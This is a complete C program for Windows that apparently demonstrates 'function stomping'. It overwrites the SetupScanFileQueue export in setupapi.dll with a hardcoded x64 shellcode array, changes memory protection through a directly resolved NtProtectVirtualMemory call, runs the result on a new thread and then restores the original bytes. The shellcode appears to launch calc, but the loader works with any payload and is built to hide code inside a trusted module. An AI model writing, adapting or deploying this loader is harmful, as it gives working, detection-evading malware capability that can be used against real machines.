#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>

// Configuration parameters
#define TARGET_DLL "setupapi.dll"
#define TARGET_FUNC "SetupScanFileQueue"
#define MAX_PATH_SIZE 260

// Error reporting macros
#define LOG_ERROR(msg) fprintf(stderr, "[!] ERROR: %s (Line %d)\n", msg, __LINE__)
#define LOG_WIN32_ERROR(msg) \
    do { \
        DWORD err = GetLastError(); \
        fprintf(stderr, "[!] ERROR: %s (Line %d) - Win32 Error 0x%X\n", msg, __LINE__, err); \
    } while(0)

// System call function pointer type
typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect);

// Global system call function pointer
NtProtectVirtualMemory_t NtProtectVirtualMemory = NULL;

// Initialize system call functions
BOOL InitSyscallFunctions() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        LOG_ERROR("Failed to get ntdll handle");
        return FALSE;
    }

    // Get the memory protection system call
    NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(ntdll, "NtProtectVirtualMemory");
    if (!NtProtectVirtualMemory) {
        LOG_ERROR("Failed to get NtProtectVirtualMemory");
        return FALSE;
    }

    return TRUE;
}

// Safely get function address
FARPROC GetFuncAddr(HMODULE hModule, LPCSTR funcName) {
    if (!hModule) {
        LOG_ERROR("Invalid module handle");
        return NULL;
    }

    FARPROC funcAddr = GetProcAddress(hModule, funcName);
    if (!funcAddr) {
        LOG_WIN32_ERROR("GetProcAddress failed");
        return NULL;
    }

    printf("[+] Located function %s at: 0x%p\n", funcName, funcAddr);
    return funcAddr;
}

// Stealthy memory protection modification
BOOL SetMemoryProtection(LPVOID address, SIZE_T size, DWORD newProtect, PULONG oldProtect) {
    NTSTATUS status = NtProtectVirtualMemory(
        GetCurrentProcess(),
        &address,
        (PSIZE_T)&size,
        newProtect,
        oldProtect
    );

    if (status != 0) {
        fprintf(stderr, "[!] NtProtectVirtualMemory failed with status: 0x%X\n", status);
        return FALSE;
    }
    return TRUE;
}

// Find alternative export if primary is unavailable
FARPROC FindAltExport(HMODULE hModule, LPCSTR primaryFunc, LPCSTR altFunc) {
    FARPROC funcAddr = GetFuncAddr(hModule, primaryFunc);
    if (!funcAddr) {
        printf("[*] Primary function %s not found, trying alternative: %s\n", primaryFunc, altFunc);
        funcAddr = GetFuncAddr(hModule, altFunc);
    }
    return funcAddr;
}

// Check if function is suitable for stomping
BOOL IsFuncSuitable(FARPROC funcAddr, SIZE_T requiredSize) {
    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery(funcAddr, &mbi, sizeof(mbi))) {
        if (mbi.State != MEM_COMMIT) {
            LOG_ERROR("Target memory not committed");
            return FALSE;
        }

        // Check if there's sufficient space
        SIZE_T availableSpace = (SIZE_T)mbi.BaseAddress + mbi.RegionSize - (SIZE_T)funcAddr;
        if (availableSpace < requiredSize) {
            LOG_ERROR("Insufficient space in memory region");
            return FALSE;
        }

        return TRUE;
    }
    return FALSE;
}

// Securely load DLL from system directory
HMODULE SecureLoadDll(LPCSTR dllName) {
    char dllPath[MAX_PATH];
    ZeroMemory(dllPath, MAX_PATH);

    // Get system directory path
    UINT sysDirLen = GetSystemDirectoryA(dllPath, MAX_PATH);
    if (sysDirLen == 0 || sysDirLen > MAX_PATH - 10) {
        LOG_WIN32_ERROR("GetSystemDirectoryA failed");
        return NULL;
    }

    // Construct full DLL path
    dllPath[sysDirLen] = '\\';
    strncpy_s(dllPath + sysDirLen + 1, MAX_PATH - sysDirLen - 1, dllName, MAX_PATH - sysDirLen - 1);

    printf("[*] Loading DLL from: %s\n", dllPath);

    // Load the DLL
    return LoadLibraryA(dllPath);
}

int main() {
    printf("[*] Starting Function Stomping Operation\n");
    printf("[*] Target: %s!%s\n", TARGET_DLL, TARGET_FUNC);

    // Initialize system call functions
    if (!InitSyscallFunctions()) {
        LOG_ERROR("Syscall initialization failed");
        return 1;
    }

    // Securely load target DLL
    printf("[*] Loading %s\n", TARGET_DLL);
    HMODULE hTargetModule = SecureLoadDll(TARGET_DLL);
    if (!hTargetModule) {
        LOG_WIN32_ERROR("LoadLibraryA failed");
        return 1;
    }
    printf("[+] DLL loaded at: 0x%p\n", hTargetModule);

    // Get target function address
    FARPROC pTargetFunc = FindAltExport(hTargetModule, TARGET_FUNC, "SetupScanFileQueue");
    if (!pTargetFunc) {
        FreeLibrary(hTargetModule);
        return 1;
    }

    unsigned char payload[] = {
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
        0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
        0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
        0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
        0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
        0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
        0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
        0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
        0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
        0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
        0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
        0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
        0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
        0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
        0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
        0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
        0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
        0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
        0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
        0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
    };
    SIZE_T payloadSize = sizeof(payload);

    // Verify target function suitability
    if (!IsFuncSuitable(pTargetFunc, payloadSize)) {
        LOG_ERROR("Target function not suitable for stomping");
        FreeLibrary(hTargetModule);
        return 1;
    }

    // Preserve original function bytes
    unsigned char* originalBytes = (unsigned char*)malloc(payloadSize);
    if (!originalBytes) {
        LOG_ERROR("Memory allocation failed");
        FreeLibrary(hTargetModule);
        return 1;
    }
    memcpy(originalBytes, pTargetFunc, payloadSize);
    printf("[*] Original function bytes preserved\n");

    // Modify memory protection attributes
    printf("[*] Modifying memory protection\n");
    ULONG oldProtect = 0;
    if (!SetMemoryProtection(pTargetFunc, payloadSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        LOG_ERROR("Memory protection modification failed");
        free(originalBytes);
        FreeLibrary(hTargetModule);
        return 1;
    }
    printf("[+] Memory protection updated (previous: 0x%X)\n", oldProtect);

    // Inject payload into target function
    printf("[*] Writing payload to target function\n");
    memcpy(pTargetFunc, payload, payloadSize);
    printf("[+] Payload successfully injected\n");

    // Execute the modified function
    printf("[#] Press ENTER to execute the modified function...");
    getchar();

    printf("[*] Executing function\n");
    __try {
        // Create thread to execute target function
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pTargetFunc, NULL, 0, NULL);
        if (hThread) {
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
            printf("[+] Function executed successfully\n");
        }
        else {
            LOG_WIN32_ERROR("Thread creation failed");
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        LOG_ERROR("Execution exception occurred");
    }

    // Restore original function code
    printf("[*] Restoring original function\n");
    memcpy(pTargetFunc, originalBytes, payloadSize);
    free(originalBytes);

    // Restore original memory protection
    ULONG tempProtect;
    SetMemoryProtection(pTargetFunc, payloadSize, oldProtect, &tempProtect);
    printf("[+] Original state restored\n");

    // Clean up resources
    FreeLibrary(hTargetModule);
    printf("[+] Cleanup completed\n");

    return 0;
}